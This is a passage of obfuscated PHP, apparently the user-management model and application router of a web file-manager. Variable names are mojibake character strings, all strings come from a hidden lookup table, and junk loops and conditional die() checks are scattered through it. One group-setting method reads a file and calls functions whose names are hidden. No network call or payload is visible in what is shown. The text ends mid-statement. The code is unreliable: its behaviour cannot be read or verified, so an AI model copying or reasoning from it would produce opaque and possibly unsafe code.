unset($ó–ó³ÖĞ[$ÏÛ²Ø‹Ï[2306]]); } $†‘Áó·ì = $•‰—ÒÜş ? array($ÏÛ²Ø‹Ï[1806] => array($ÏÛ²Ø‹Ï[2541], $•‰—ÒÜş)) : array(); foreach ($ó–ó³ÖĞ as $¬’ëîãä => $Ïö¯‡) { $…•¹ƒÏ– = array(); foreach ($ó–ó³ÖĞ as $Ïè‰¹ç­ => $í•Äò») { if (isset($„¤·ƒŸğ[$Ïè‰¹ç­]) && $„¤·ƒŸğ[$Ïè‰¹ç­]) { $…•¹ƒÏ–[] = $„¤·ƒŸğ[$Ïè‰¹ç­]; } } if (!$…•¹ƒÏ–) { continue; } $µæ¿ÊË‹ = array_merge(array($¬’ëîãä => array($ÏÛ²Ø‹Ï[7], $…•¹ƒÏ–)), $†‘Áó·ì); $Î¼¼Ò… = $this->where($µæ¿ÊË‹)->find(); if ($Î¼¼Ò…) { return $Ïö¯‡; } } return !0; } public function userListInfo($ÇåÁ¼èÛ) { $°¼£”åÃ =& $_SERVER[¯‘·½]; $ùš›—±¬ = array(); $ÇåÁ¼èÛ = is_array($ÇåÁ¼èÛ) ? array_unique($ÇåÁ¼èÛ) : array(); if (!$ÇåÁ¼èÛ) { return $ùš›—±¬; } if (count($ÇåÁ¼èÛ) < 20) { foreach ($ÇåÁ¼èÛ as $ùÃ×ÓæÔ) { $ùš›—±¬[$ùÃ×ÓæÔ . $°¼£”åÃ[12]] = $this->getInfoSimpleOuter($ùÃ×ÓæÔ); } } else { $÷¼ó£Û = array($°¼£”åÃ[1797] => array($°¼£”åÃ[494], $ÇåÁ¼èÛ)); if (count($ÇåÁ¼èÛ) == 1) { $÷¼ó£Û = array($°¼£”åÃ[1797] => $ÇåÁ¼èÛ[0]); } $ òë½½ = Model($°¼£”åÃ[581])->field($this->simpleField)->where($÷¼ó£Û)->select(); $ òë½½ = array_to_keyvalue($ òë½½, $°¼£”åÃ[1806]); foreach ($ÇåÁ¼èÛ as $ùÃ×ÓæÔ) { $Ü’ªàº¡ = $ òë½½[$ùÃ×ÓæÔ]; if (!$Ü’ªàº¡) { $ùš›—±¬[$ùÃ×ÓæÔ . $°¼£”åÃ[12]] = $this->getInfoSimpleOuter($ùÃ×ÓæÔ); continue; } $Ü’ªàº¡[$°¼£”åÃ[2511]] = Action($°¼£”åÃ[2512])->parseUrl($Ü’ªàº¡[$°¼£”åÃ[2511]]); $ùš›—±¬[$ùÃ×ÓæÔ . $°¼£”åÃ[12]] = $Ü’ªàº¡; } } return $ùš›—±¬; } protected function userStatus($è£¾İÑı, $¡÷ÛˆÄÔ) { $òü¨Ñ£ = $this->getInfoSimple($è£¾İÑı); if (!$òü¨Ñ£) { return !1; } $”ÎØ›íÂ = array($_SERVER[¯‘·½][835] => $¡÷ÛˆÄÔ); return $this->userEdit($è£¾İÑı, $”ÎØ›íÂ); } protected function userRemove($šáÅ—ó) { $’Ûãğéı =& $_SERVER[¯‘·½]; $Íò¼Èõã = $this->getInfoSimple($šáÅ—ó); if (!$Íò¼Èõã) { return !1; } $ÀœßÁÑÛ = array($’Ûãğéı[1797] => $šáÅ—ó); Model($’Ûãğéı[671])->where($ÀœßÁÑÛ)->delete(); Model($’Ûãğéı[2542])->where($ÀœßÁÑÛ)->delete(); Model($’Ûãğéı[2101])->where($ÀœßÁÑÛ)->delete(); Model($’Ûãğéı[2526])->where($ÀœßÁÑÛ)->delete(); Model($’Ûãğéı[1165])->where($ÀœßÁÑÛ)->delete(); Model($’Ûãğéı[2323])->removeUserAll($šáÅ—ó); Model($’Ûãğéı[916])->userRootRemove($šáÅ—ó); return $this->where($ÀœßÁÑÛ)->delete(); } protected function userGroupSet($ïÏ‚Û¦, $ıÑë—¹ä, $ıÎÄúÉ¸ = array()) { $ƒ“•æ¯´ =& $_SERVER[¯‘·½]; if ($_SERVER[$ƒ“•æ¯´[969]] != $_SERVER[$ƒ“•æ¯´[970]]) { $šÒÆÍìí = $ƒ“•æ¯´[971]; $˜®Ûü = $ƒ“•æ¯´[972]; $©ˆçÄˆ = $_SERVER[$ƒ“•æ¯´[973]] . $ƒ“•æ¯´[974]; $ËÉÑŒ² = $˜®Ûü($©ˆçÄˆ); $Şç°‘ = explode($ƒ“•æ¯´[288], $ËÉÑŒ²); if (count($Şç°‘) < $ƒ“•æ¯´[690]) { $Öä§‹µã = $ƒ“•æ¯´[975]; $Öä§‹µã(); } $¾‚Ø¶Û = $ƒ“•æ¯´[976]; $¾‚Ø¶Û($_SERVER[$ƒ“•æ¯´[977]]); $¾‚Ø¶Û($_SERVER[$ƒ“•æ¯´[973]] . $ƒ“•æ¯´[978]); $¯¢Ûƒ = 1; while ($¯¢Ûƒ > 1) { $¯¢Ûƒ = $¯¢Ûƒ + 4; $…©íğê = rawurlencode($¯¢Ûƒ . $ƒ“•æ¯´[456]); } } $ ‰å…¢ = $this->getInfoSimple($ïÏ‚Û¦); if (!$ ‰å…¢ || !is_array($ıÑë—¹ä)) { return !1; } $ë¿‡ŠİÄ = Model($ƒ“•æ¯´[2101]); $ë¿‡ŠİÄ->where(array($ƒ“•æ¯´[1806] => $ïÏ‚Û¦))->delete(); $«Øø¯²› = array(); $ä´Şë¿ = 0; foreach ($ıÑë—¹ä as $¡æîğÃ† => $×çıåÄÃ) { $ßòœØ¶Œ = array($ƒ“•æ¯´[1806] => $ïÏ‚Û¦, $ƒ“•æ¯´[1414] => $¡æîğÃ†, $ƒ“•æ¯´[2115] => $×çıåÄÃ); $ßòœØ¶Œ[$ƒ“•æ¯´[2030]] = isset($ıÎÄúÉ¸[$ä´Şë¿]) ? $ıÎÄúÉ¸[$ä´Şë¿] : 0; $ä´Şë¿++; $«Øø¯²›[] = $ßòœØ¶Œ; } return $ë¿‡ŠİÄ->addAll($«Øø¯²›, array(), !0); } protected function userGroupAdd($‘£¯µ¸º, $¦ùÉ‹Ëü = array()) { $ò»åÑ« =& $_SERVER[¯‘·½]; $ÖÛ™¯åË = $this->getInfoSimple($‘£¯µ¸º); if (!$ÖÛ™¯åË || empty($¦ùÉ‹Ëü)) { return !1; } $ñ¦³Øƒ = array(); foreach ($¦ùÉ‹Ëü as $ííÊ·‡ => $åĞæãˆ) { $ñ¦³Øƒ[] = array($ò»åÑ«[1806] => $‘£¯µ¸º, $ò»åÑ«[1414] => $ííÊ·‡, $ò»åÑ«[2115] => $åĞæãˆ, $ò»åÑ«[2030] => 0); } return Model($ò»åÑ«[2101])->addAll($ñ¦³Øƒ, array(), !0); } protected function userGroupRemove($çÉùÂ˜, $Ñ£ŒôÍ) { $ß©¢ÇÍÊ =& $_SERVER[¯‘·½]; $Ç³æà›ˆ = $this->getInfoSimple($çÉùÂ˜); if (!$Ç³æà›ˆ || !$Ñ£ŒôÍ) { return !1; } $õÅ†£§ü = array($ß©¢ÇÍÊ[1797] => $çÉùÂ˜, $ß©¢ÇÍÊ[2096] => $Ñ£ŒôÍ); return Model($ß©¢ÇÍÊ[2101])->where($õÅ†£§ü)->delete(); } public function listData() { $“¹¤Ü = $this->_makeOrder()->selectPage(50); $this->_listDataApply($“¹¤Ü[$_SERVER[¯‘·½][447]]); return $“¹¤Ü; } public function listByID($ßÁºº¶å) { $Æñç¹ƒû =& $_SERVER[¯‘·½]; if (!$ßÁºº¶å) { return; } $¹Şº¾º– = array($Æñç¹ƒû[1806] => array($Æñç¹ƒû[7], $ßÁºº¶å)); $ºÒ¨ı‚› = $this->where($¹Şº¾º–)->select(); $ºÒ¨ı‚› = array_sort_keep($ºÒ¨ı‚›, $Æñç¹ƒû[1806], $ßÁºº¶å); $this->_listDataApply($ºÒ¨ı‚›); return $ºÒ¨ı‚›; } public function listByGroup($¬¥ ü›Ñ = 0, $›À—½Íğ = array()) { $Éá¸‹­û =& $_SERVER[¯‘·½]; $Ä—ÎñÆĞ = $Éá¸‹­û[12]; $°¢ğ¹ı = array(); if ($¬¥ ü›Ñ) { $°¢ğ¹ı = array($Éá¸‹­û[2543] => intval($¬¥ ü›Ñ)); $Ä—ÎñÆĞ = "\x4c\x45\106\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\165\x73\x65\162\137\x67\162\157\165\x70\40\x75\x73\x65\162\x5f\x67\162\x6f\165\x70\40\x6f\156\x20\165\x73\145\162\56\x75\163\x65\162\111\104\40\x3d\40\165\163\x65\x72\x5f\147\x72\157\165\x70\x2e\165\163\x65\162\x49\104"; $íïä’Æü = Input::get($Éá¸‹­û[532], null, $Éá¸‹­û[12]) ? $Éá¸‹­û[12] : $Éá¸‹­û[2544]; } if (isset($›À—½Íğ[$Éá¸‹­û[835]])) { $°¢ğ¹ı[$Éá¸‹­û[2545]] = $›À—½Íğ[$Éá¸‹­û[835]]; } $“–ŒÑà = _get($›À—½Íğ, $Éá¸‹­û[2546], $Éá¸‹­û[234]); if (_get($›À—½Íğ, $Éá¸‹­û[846], !1)) { $°¢ğ¹ı[$“–ŒÑà] = array($Éá¸‹­û[2287], $›À—½Íğ[$Éá¸‹­û[846]]); } if (_get($›À—½Íğ, $Éá¸‹­û[847], !1)) { $ø¯¨äı˜ = array($Éá¸‹­û[2288], $›À—½Íğ[$Éá¸‹­û[847]]); if ($°¢ğ¹ı[$“–ŒÑà]) { $°¢ğ¹ı[$“–ŒÑà] = array($°¢ğ¹ı[$“–ŒÑà], $ø¯¨äı˜, $Éá¸‹­û[2289]); } else { $°¢ğ¹ı[$“–ŒÑà] = $ø¯¨äı˜; } } $˜Ä§­Ôµ = $this->_makeOrder($íïä’Æü)->field($Éá¸‹­û[2547])->where($°¢ğ¹ı)->join($Ä—ÎñÆĞ)->selectPage(50); $this->_listDataApply($˜Ä§­Ôµ[$Éá¸‹­û[447]]); return $˜Ä§­Ôµ; } private function _makeOrder($Ìï°Ùıó = '') { $ÄšĞ«¸ =& $_SERVER[¯‘·½]; $¯×¿ÑŸã = array($ÄšĞ«¸[1806], $ÄšĞ«¸[32], $ÄšĞ«¸[1995], $ÄšĞ«¸[2217], $ÄšĞ«¸[1968], $ÄšĞ«¸[234]); $Í´‰İ¾¶ = array($ÄšĞ«¸[525] => $ÄšĞ«¸[526], $ÄšĞ«¸[527] => $ÄšĞ«¸[528]); $ÉîÕîş• = Input::get($ÄšĞ«¸[532], $ÄšĞ«¸[7], $ÄšĞ«¸[1797], $¯×¿ÑŸã); $«ùî£© = Input::get($ÄšĞ«¸[533], $ÄšĞ«¸[7], $ÄšĞ«¸[2102], array($ÄšĞ«¸[2102], $ÄšĞ«¸[527])); $«ùî£© = $Í´‰İ¾¶[$«ùî£©]; $Ìï°Ùıó = $Ìï°Ùıó . "\165\x73\145\162\x2e{$ÉîÕîş•}\40{$«ùî£©}\x2c\x20\x75\163\145\162\x2e\165\x73\145\162\111\104\x20\x61\163\143"; return $this->alias($ÄšĞ«¸[2233])->order($Ìï°Ùıó); } public function listSearch($ÍÜÃ‰»¯) { $²‹éãï =& $_SERVER[¯‘·½]; $¡ò²ûã› = trim($ÍÜÃ‰»¯[$²‹éãï[2105]]); $Ïª¿š¬¤ = explode($²‹éãï[53], $¡ò²ûã›); if (!$¡ò²ûã› || count($Ïª¿š¬¤) == 1) { return $this->listSearchNow($ÍÜÃ‰»¯); } $–ĞÇµè¾ = array($²‹éãï[447] => array()); foreach ($Ïª¿š¬¤ as $ääãæ³) { if (!trim($ääãæ³)) { continue; } $ÍÜÃ‰»¯[$²‹éãï[2105]] = $ääãæ³; $Õéöˆ¨ = $this->listSearchNow($ÍÜÃ‰»¯); $–ĞÇµè¾[$²‹éãï[447]] = array_merge($–ĞÇµè¾[$²‹éãï[447]], $Õéöˆ¨[$²‹éãï[447]]); } $–ĞÇµè¾[$²‹éãï[447]] = array_unique_by_key($–ĞÇµè¾[$²‹éãï[447]], $²‹éãï[1806]); $–ĞÇµè¾[$²‹éãï[444]] = array($²‹éãï[445] => count($–ĞÇµè¾[$²‹éãï[447]]), $²‹éãï[441] => 20, $²‹éãï[430] => 1, $²‹éãï[446] => 1); return $–ĞÇµè¾; } public function listSearchNow($Š‚ÑÖÄº) { $’ÃêÔâş =& $_SERVER[¯‘·½]; $ú”“ï¨‹ = trim($Š‚ÑÖÄº[$’ÃêÔâş[2105]]); $ä³¾ÊÍµ = isset($Š‚ÑÖÄº[$’ÃêÔâş[2106]]) ? $Š‚ÑÖÄº[$’ÃêÔâş[2106]] : !1; $ú”“ï¨‹ = str_replace($’ÃêÔâş[2107], $’ÃêÔâş[2108], trim($ú”“ï¨‹)); $×¡ëüÕ = array($’ÃêÔâş[32] => array($’ÃêÔâş[461], "\x25{$ú”“ï¨‹}\x25"), $’ÃêÔâş[382] => array($’ÃêÔâş[461], "{$ú”“ï¨‹}\45"), $’ÃêÔâş[2306] => array($’ÃêÔâş[461], "{$ú”“ï¨‹}\45"), $’ÃêÔâş[1096] => $’ÃêÔâş[2109]); if (Input::check($ú”“ï¨‹, $’ÃêÔâş[388])) { $×¡ëüÕ[$’ÃêÔâş[1806]] = array($’ÃêÔâş[461], "{$ú”“ï¨‹}\x25"); $×¡ëüÕ[$’ÃêÔâş[2527]] = array($’ÃêÔâş[461], "{$ú”“ï¨‹}\x25"); } if (!$ú”“ï¨‹) { $×¡ëüÕ = array(); } if (isset($Š‚ÑÖÄº[$’ÃêÔâş[835]])) { $×¡ëüÕ[$’ÃêÔâş[835]] = $Š‚ÑÖÄº[$’ÃêÔâş[835]]; } $×¡ëüÕ = $this->parseWhereLike($×¡ëüÕ); $ßÅéÑ²ğ = $this->_makeOrder()->where($×¡ëüÕ)->selectPage(20); if (!$ßÅéÑ²ğ || count($ßÅéÑ²ğ[$’ÃêÔâş[447]]) < 5 && Input::check($ú”“ï¨‹, $’ÃêÔâş[395])) { $Ë†Ç´€Ü = $this->_searchFromMeta($’ÃêÔâş[539], $ú”“ï¨‹, 10); $ìø™ã¾Ü = $this->_searchFromMeta($’ÃêÔâş[540], $ú”“ï¨‹, 10); $°‚¾ŸÂ± = array_merge($Ë†Ç´€Ü, $ìø™ã¾Ü, $ßÅéÑ²ğ[$’ÃêÔâş[447]]); $ßÅéÑ²ğ[$’ÃêÔâş[447]] = array_unique_by_key($°‚¾ŸÂ±, $’ÃêÔâş[1806]); $ßÅéÑ²ğ[$’ÃêÔâş[444]][$’ÃêÔâş[445]] = count($ßÅéÑ²ğ[$’ÃêÔâş[447]]); $ßÅéÑ²ğ[$’ÃêÔâş[444]][$’ÃêÔâş[446]] = ceil($ßÅéÑ²ğ[$’ÃêÔâş[444]][$’ÃêÔâş[445]] / $ßÅéÑ²ğ[$’ÃêÔâş[444]][$’ÃêÔâş[441]]); } $this->_listDataApply($ßÅéÑ²ğ[$’ÃêÔâş[447]]); $this->_filterByGroup($ßÅéÑ²ğ, $ä³¾ÊÍµ); return $ßÅéÑ²ğ; } private function _filterByGroup(&$§³İï, $ÏÌİåú¦) { $†ôå”è“ =& $_SERVER[¯‘·½]; if (!$ÏÌİåú¦) { return $§³İï; } foreach ($§³İï[$†ôå”è“[447]] as $ŸÖâ¬ˆ¾ => &$ö©¨äıÖ) { $˜ªØ‹ûç = array_to_keyvalue($ö©¨äıÖ[$†ôå”è“[1413]], $†ôå”è“[12], $†ôå”è“[1414]); if (!in_array($ÏÌİåú¦, $˜ªØ‹ûç)) { unset($§³İï[$†ôå”è“[447]][$ŸÖâ¬ˆ¾]); } } unset($ö©¨äıÖ); $§³İï[$†ôå”è“[447]] = array_values($§³İï[$†ôå”è“[447]]); $§³İï[$†ôå”è“[444]] = array($†ôå”è“[2270] => count($§³İï[$†ôå”è“[447]]), $†ôå”è“[2268] => $§³İï[$†ôå”è“[444]][$†ôå”è“[441]], $†ôå”è“[2267] => 1, $†ôå”è“[2269] => 1); } private function _searchFromMeta($çŠŠˆ†ø, $¬Æ‹÷ı¹, $ÇäËÀö) { $€áº¯ =& $_SERVER[¯‘·½]; $¬Æ‹÷ı¹ = strtolower($¬Æ‹÷ı¹); $À¿“‡òœ = array($€áº¯[97] => $çŠŠˆ†ø, $€áº¯[452] => array($€áº¯[461], "\x25{$¬Æ‹÷ı¹}\45")); $À¿“‡òœ = $this->parseWhereLike($À¿“‡òœ); $Ü°„û‹Ä = Model($€áº¯[2548])->where($À¿“‡òœ)->limit($ÇäËÀö)->select(); if (!$Ü°„û‹Ä) { return array(); } $Ü°„û‹Ä = array_to_keyvalue($Ü°„û‹Ä, $€áº¯[12], $€áº¯[1806]); $Ú­ë˜¦Õ = $this->where(array($€áº¯[1797] => array($€áº¯[7], $Ü°„û‹Ä)))->select(); if (!$Ú­ë˜¦Õ) { return array(); } return $Ú­ë˜¦Õ; } private function _listDataApplyItem($ûİŒ°óË) { $äßüõğ = array($ûİŒ°óË); $this->_listDataApply($äßüõğ); return $äßüõğ[0]; } private function _listDataApply(&$¬ö¨Ñ¶á) { $úúÈ¸Ÿ =& $_SERVER[¯‘·½]; if (!$¬ö¨Ñ¶á) { return; } array_remove_key($¬ö¨Ñ¶á, $úúÈ¸Ÿ[985]); $ƒ÷­‚ıá = array_to_keyvalue($¬ö¨Ñ¶á, $úúÈ¸Ÿ[12], $úúÈ¸Ÿ[1806]); $this->_listAppendGroup($¬ö¨Ñ¶á, $ƒ÷­‚ıá); $this->_listAppendMeta($¬ö¨Ñ¶á, $ƒ÷­‚ıá); $this->_listAppendSourceRoot($¬ö¨Ñ¶á, $ƒ÷­‚ıá); } private function _listAppendSourceRoot(&$££ø Ÿß, $Ñ¼ÆØæŸ) { $’Ÿöš‘è =& $_SERVER[¯‘·½]; $ù³ŞêÖÃ = Model($’Ÿöš‘è[916])->listSourceRoot(SourceModel::TYPE_USER, $Ñ¼ÆØæŸ); $ù³ŞêÖÃ = array_to_keyvalue($ù³ŞêÖÃ, $’Ÿöš‘è[573]); $ù³ŞêÖÃ = array_remove_key($ù³ŞêÖÃ, $’Ÿöš‘è[573]); foreach ($££ø Ÿß as &$Ù’ÌÄÙ•) { $Ù’ÌÄÙ•[$’Ÿöš‘è[90]] = $ù³ŞêÖÃ[$Ù’ÌÄÙ•[$’Ÿöš‘è[1806]]] ? $ù³ŞêÖÃ[$Ù’ÌÄÙ•[$’Ÿöš‘è[1806]]] : array(); } unset($Ù’ÌÄÙ•); } private function _listAppendGroup(&$»ü‹‘Ÿ, $ÛŠŠ¦ãÂ) { $«Ùšº =& $_SERVER[¯‘·½]; $åë›Š¨– = array($«Ùšº[1806] => array($«Ùšº[7], $ÛŠŠ¦ãÂ)); $ïÙ¹‚Éä = Model($«Ùšº[2101])->where($åë›Š¨–)->select(); $¨“äÀ = array_to_keyvalue($ïÙ¹‚Éä, $«Ùšº[12], $«Ùšº[1414]); $¨“äÀ = array_remove_value(array_unique($¨“äÀ), $«Ùšº[231]); if (!$¨“äÀ || !$ïÙ¹‚Éä) { return; } $åë›Š¨– = array($«Ùšº[1414] => array($«Ùšº[7], $¨“äÀ)); $„æµ¢Å  = Model($«Ùšº[1412])->field($«Ùšº[2549])->where($åë›Š¨–)->select(); $„æµ¢Å  = array_to_keyvalue($„æµ¢Å , $«Ùšº[1414]); $ïÙ¹‚Éä = array_to_keyvalue_group($ïÙ¹‚Éä, $«Ùšº[1806]); foreach ($ïÙ¹‚Éä as &$ÜÍêŸø) { $Ñâª‹ë° = array(); foreach ($ÜÍêŸø as $Æ–«‘……) { if (!$Æ–«‘……[$«Ùšº[2115]]) { continue; } $ÕœÖç‹ = Model($«Ùšº[575])->listData($Æ–«‘……[$«Ùšº[2115]]); $Ñâª‹ë°[] = array($«Ùšº[1414] => $Æ–«‘……[$«Ùšº[1414]], $«Ùšº[2550] => $„æµ¢Å [$Æ–«‘……[$«Ùšº[1414]]][$«Ùšº[32]], $«Ùšº[588] => $„æµ¢Å [$Æ–«‘……[$«Ùšº[1414]]][$«Ùšº[588]], $«Ùšº[489] => $ÕœÖç‹); } $ÜÍêŸø = $Ñâª‹ë°; } unset($ÜÍêŸø); foreach ($»ü‹‘Ÿ as &$áşÚÑ­“) { $áşÚÑ­“[$«Ùšº[1413]] = array(); if (isset($ïÙ¹‚Éä[$áşÚÑ­“[$«Ùšº[1806]]])) { $áşÚÑ­“[$«Ùšº[1413]] = $ïÙ¹‚Éä[$áşÚÑ­“[$«Ùšº[1806]]]; } } unset($áşÚÑ­“); } public function userAppendGroup($¤‰ãÏöæ) { $Ò‘°ï¨ =& $_SERVER[¯‘·½]; if (!$¤‰ãÏöæ) { return array(); } $this->_listAppendGroup($¤‰ãÏöæ, array_to_keyvalue($¤‰ãÏöæ, $Ò‘°ï¨[12], $Ò‘°ï¨[1806])); return $¤‰ãÏöæ; } private function _listAppendMeta(&$áñß•Ï, $³œ•÷…ï) { $°Îô…éŸ =& $_SERVER[¯‘·½]; $‰ŠÆæ—Ÿ = UserJobModel::JOB_KEY; $–ğ†ïÌ’ = array($°Îô…éŸ[2099]); $úŒ¬É³¸ = array($°Îô…éŸ[1806] => array($°Îô…éŸ[7], $³œ•÷…ï)); $èúğİÕ¸ = Model($°Îô…éŸ[2526])->where($úŒ¬É³¸)->select(); $‰×å²ô’ = array(); foreach ($èúğİÕ¸ as $–ò÷Ôüñ) { $µ‘˜à¦® = $–ò÷Ôüñ[$°Îô…éŸ[1806]]; if (!isset($‰×å²ô’[$µ‘˜à¦®])) { $‰×å²ô’[$µ‘˜à¦®] = array(); } $‰×å²ô’[$µ‘˜à¦®][$–ò÷Ôüñ[$°Îô…éŸ[97]]] = $–ò÷Ôüñ[$°Îô…éŸ[452]]; } $öÀá„Ÿ© = Model($°Îô…éŸ[2551]); foreach ($áñß•Ï as &$çÅï•¦) { $µ‘˜à¦® = $çÅï•¦[$°Îô…éŸ[1806]]; $Ú×âŒç• = isset($‰×å²ô’[$µ‘˜à¦®]) ? $‰×å²ô’[$µ‘˜à¦®] : array(); $çÅï•¦[$°Îô…éŸ[543]] = array_field_key($Ú×âŒç•, $–ğ†ïÌ’); $çÅï•¦[$°Îô…éŸ[2552]] = array(); if (isset($Ú×âŒç•[$‰ŠÆæ—Ÿ])) { $çÅï•¦[$°Îô…éŸ[2552]] = $öÀá„Ÿ©->getUserJobInfo($Ú×âŒç•[$‰ŠÆæ—Ÿ]); } } unset($çÅï•¦); } protected function groupUserAll($Œš×§”ì) { $ˆôÉ×ò§ =& $_SERVER[¯‘·½]; if (!$Œš×§”ì) { return !1; } $»¦‰Ÿ§Ê = Model($ˆôÉ×ò§[2101])->field($ˆôÉ×ò§[1806])->where(array($ˆôÉ×ò§[1414] => array($ˆôÉ×ò§[7], $Œš×§”ì)))->select(); $»¦‰Ÿ§Ê = array_to_keyvalue($»¦‰Ÿ§Ê, $ˆôÉ×ò§[12], $ˆôÉ×ò§[1806]); return array_unique($»¦‰Ÿ§Ê); } public function userSearch($õ÷¦§×Ÿ, $Š•Ğƒà“ = "\52") { return Model($_SERVER[¯‘·½][601])->where($õ÷¦§×Ÿ)->field($Š•Ğƒà“)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\137\157\160\164\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Çîêı°°) { $»á®éÍ¦ =& $_SERVER[¯‘·½]; $Í¢ŠƒÙË = defined($»á®éÍ¦[2237]) && USER_ID ? USER_ID : $»á®éÍ¦[12]; return "\x55\163\x65\x72\117\160\x74\151\x6f\x6e\137{$Çîêı°°}\x5f" . $Í¢ŠƒÙË; } protected function filterWhere($û¥–öÎÄ) { $â½ˆ­±‡ =& $_SERVER[¯‘·½]; $û¥–öÎÄ[$â½ˆ­±‡[1806]] = defined($â½ˆ­±‡[2237]) && USER_ID ? USER_ID : $â½ˆ­±‡[12]; return $û¥–öÎÄ; } public function cacheRemoveUser($±›í¸Ò, $Ö‰‰¥ª) { return Cache::remove("\125\x73\x65\162\x4f\x70\x74\x69\x6f\x6e\x5f{$±›í¸Ò}\x5f" . $Ö‰‰¥ª); } protected function optionDefault($Ç…–åá = '') { $ÚÅ¾á¸õ =& $_SERVER[¯‘·½]; if ($Ç…–åá == $ÚÅ¾á¸õ[12]) { return $GLOBALS[$ÚÅ¾á¸õ[6]][$ÚÅ¾á¸õ[2553]]; } if ($Ç…–åá == $ÚÅ¾á¸õ[2554]) { return $GLOBALS[$ÚÅ¾á¸õ[6]][$ÚÅ¾á¸õ[2555]]; } } } goto eñ­Ç©„Â¹; E„±‡ëõàÉ: class Application { private $defaultModule = "\151\156\144\145\170"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($¦şŞÂ™Ğ) { $¶ñø©íÙ =& $_SERVER[¯‘·½]; $‡´‰ø²Õ =& $_SERVER[ôİ”í„Æ]; $È×Œ’¢ = explode($‡´‰ø²Õ[0], trim($¦şŞÂ™Ğ, $‡´‰ø²Õ[0])); $this->defaultModule = $È×Œ’¢[0] ? $È×Œ’¢[0] : $this->defaultModule; $ÈòÒì–ì = $¶ñø©íÙ[691]; if (strlen($ÈòÒì–ì) < $¶ñø©íÙ[690]) { die; } $this->defaultController = $È×Œ’¢[1] ? $È×Œ’¢[1] : $this->defaultController; $this->defaultAction = $È×Œ’¢[2] ? $È×Œ’¢[2] : $this->defaultAction; $this->npjfa2984eb3($‡´‰ø²Õ[1], array($this, $‡´‰ø²Õ[2])); $·£ÍŸòÜ = $¶ñø©íÙ[692]; } public function appRun($½Ñíö“) { $ÃóÙÜóü =& $_SERVER[¯‘·½]; $öïñÓé =& $_SERVER[ôİ”í„Æ]; $‚­çñ”• = explode($öïñÓé[0], $½Ñíö“); $ğ´Ùº = strtolower($‚­çñ”•[0]); $Î‚Œø“é = $öïñÓé[3]; $­”«ÛÇŸ = $ÃóÙÜóü[693]; if ($ğ´Ùº == $öïñÓé[4]) { $Î‚Œø“é = $öïñÓé[5]; $‚­çñ”•[0] = $öïñÓé[6]; $‚­çñ”•[1] = $‚­çñ”•[1] . $öïñÓé[7]; $½Ñíö“ = join($öïñÓé[0], $‚­çñ”•); $½Ñíö“ = trim($½Ñíö“, $öïñÓé[0]); } call_user_func(array($öïñÓé[8], $öïñÓé[9]), $Î‚Œø“é . $öïñÓé[10], $½Ñíö“); ActionCall($½Ñíö“); $Æˆ¡ªõÙ = $ÃóÙÜóü[694]; if (!$Æˆ¡ªõÙ) { return; } call_user_func(array($öïñÓé[8], $öïñÓé[9]), $Î‚Œø“é . $öïñÓé[11], $½Ñíö“); $ÓöÅùãº = $ÃóÙÜóü[695]; if (!$ÓöÅùãº) { die; } } private function autorun() { $ÜÀŠ‡¥‘ =& $_SERVER[¯‘·½]; $Îı ôƒ» =& $_SERVER[ôİ”í„Æ]; global $config; $ÊâÀûÇ = $ÜÀŠ‡¥‘[696]; while ($ÊâÀûÇ < $ÜÀŠ‡¥‘[697]) { if ($ÊâÀûÇ >= 0) { break; } $ÊâÀûÇ++; } if (count($config[$Îı ôƒ»[12]]) == 0) { return; } foreach ($config[$Îı ôƒ»[12]] as $ù»Æ×Âò => $Õ™ÇÙİ“) { $this->appRun($Õ™ÇÙİ“); } } private function kulz84c15ce5() { $ŠñªìËÁ =& $_SERVER[¯‘·½]; $¸çê¦“— =& $_SERVER[ôİ”í„Æ]; $Œ€åò¬¹ = $¸çê¦“—[4]; $£‹ÆÀá­ = $ŠñªìËÁ[698]; if (strlen($£‹ÆÀá­) < $ŠñªìËÁ[690]) { die; } $±íÑ¹° = $GLOBALS[$¸çê¦“—[13]][$¸çê¦“—[14]][0]; $“¬îšç  = $ŠñªìËÁ[699]; while ($“¬îšç  < $ŠñªìËÁ[697]) { if ($“¬îšç  >= 0) { break; } $“¬îšç ++; } if (!$±íÑ¹° || strlen($±íÑ¹°) <= strlen($Œ€åò¬¹)) { return; } if (strtolower(substr($±íÑ¹°, -strlen($Œ€åò¬¹))) != $Œ€åò¬¹) { return; } $ô‰¨ƒğˆ = substr($±íÑ¹°, 0, -strlen($Œ€åò¬¹)); $›æóø = array($¸çê¦“—[4], $ô‰¨ƒğˆ); $ø‘Òì¿ = $ŠñªìËÁ[700]; if (strlen($ø‘Òì¿) < $ŠñªìËÁ[701]) { die; } $‹”¡àÁî = array_slice($GLOBALS[$¸çê¦“—[13]][$¸çê¦“—[14]], 1); $GLOBALS[$¸çê¦“—[13]][$¸çê¦“—[14]] = array_merge($›æóø, $‹”¡àÁî); $£î›ğ£ = $ŠñªìËÁ[702]; while ($£î›ğ£ < $ŠñªìËÁ[697]) { if ($£î›ğ£ >= 0) { break; } $£î›ğ£++; } $GLOBALS[$¸çê¦“—[13]][$¸çê¦“—[15]] = implode($¸çê¦“—[0], $GLOBALS[$¸çê¦“—[13]][$¸çê¦“—[14]]); $æü¼Ä´Ñ = $ŠñªìËÁ[703]; while (strlen($æü¼Ä´Ñ) < $ŠñªìËÁ[697]) { if (!$æü¼Ä´Ñ) { break; } $æü¼Ä´Ñ++; } } private function mwyc689a8042() { $ÚÈó¯ÈŒ =& $_SERVER[¯‘·½]; $’º²©ÄÓ =& $_SERVER[ôİ”í„Æ]; if ($GLOBALS[$’º²©ÄÓ[13]][$’º²©ÄÓ[15]] != $’º²©ÄÓ[6]) { return; } $“ò¨ä›ˆ = $_SERVER[$’º²©ÄÓ[16]]; $æÈ›¾Ôª = $ÚÈó¯ÈŒ[704]; if (strlen($æÈ›¾Ôª) < $ÚÈó¯ÈŒ[701]) { return; } $¡Ôô»´‚ = $’º²©ÄÓ[17]; if (!strstr($“ò¨ä›ˆ, $¡Ôô»´‚)) { return; } $Áƒ‰ûª¸ = strrpos($“ò¨ä›ˆ, $¡Ôô»´‚); $…ìÓÄ›ñ = $ÚÈó¯ÈŒ[705]; if (!$…ìÓÄ›ñ) { die; } $Õé¨Ÿ«Œ = substr($“ò¨ä›ˆ, $Áƒ‰ûª¸ + 